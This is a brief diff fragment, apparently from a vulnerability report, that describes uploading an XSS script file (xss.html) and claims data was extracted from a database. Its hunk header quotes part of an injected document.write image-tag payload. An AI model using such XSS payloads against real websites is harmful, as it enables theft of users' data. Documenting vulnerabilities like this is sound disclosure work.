@@ -13,3 +13,4 @@ document.write('<img src="'+url+'"/>');
 Then click upload, and access it
 ![](https://github.com/momo8877847/Maku-Boot/blob/main/990/IMG_20260531_091345.jpg)
 Successfully extracted from the database
+I have uploaded the XSS script file to xss.html, you can check it yourself.
